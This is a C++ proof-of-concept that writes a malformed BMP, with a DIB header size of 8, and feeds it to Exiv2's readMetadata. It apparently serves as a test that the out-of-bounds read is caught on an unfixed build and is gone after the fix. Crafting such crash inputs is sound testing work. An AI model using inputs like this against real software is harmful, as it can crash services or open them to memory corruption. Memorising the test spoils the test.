// Residual memory-safety PoC for BmpImage::readMetadata().
//
// Drives the public Exiv2 API end-to-end through the documented entry point:
// ImageFactory::open(path) followed by Image::readMetadata(). The crafted input
// is an ordinary BMP file whose DIB header-size field (offset 14) is set to a
// small value (8). Everything else is a normal, well-formed BMP of ordinary
// size, so the image is recognised as a BMP by ImageFactory.
//
// Shipped tree: readMetadata() reads the DIB header into a heap buffer sized by
// the declared header size (io_->read(headerSize - 4) == read(4)), then reads
// the 32-bit height field at offset 4 of that 4-byte buffer -> ASan
// heap-buffer-overflow.
//
// Golden tree: readMetadata() reads a fixed 26-byte buffer and takes the 32-bit
// width/height from it; the small header-size value only yields wrong numbers,
// never an out-of-bounds access.
#include <exiv2/exiv2.hpp>

#include <cstdio>
#include <fstream>
#include <vector>

int main(int argc, char** argv) {
  const char* path = (argc > 1) ? argv[1] : "/tmp/poc_residual.bmp";

  std::vector<unsigned char> bytes(96, 0);
  bytes[0] = 'B';
  bytes[1] = 'M';
  bytes[10] = 54;    // bitmap data offset
  bytes[14] = 0x08;  // DIB header size = 8 (malformed; not the 12-byte core header)
  bytes[18] = 0x80;  // start of where a width field would be
  bytes[19] = 0x02;

  {
    std::ofstream f(path, std::ios::binary | std::ios::trunc);
    f.write(reinterpret_cast<const char*>(bytes.data()), static_cast<std::streamsize>(bytes.size()));
  }

  auto image = Exiv2::ImageFactory::open(path);
  image->readMetadata();

  std::printf("pixelWidth=%u pixelHeight=%u\n", static_cast<unsigned>(image->pixelWidth()),
              static_cast<unsigned>(image->pixelHeight()));
  return 0;
}
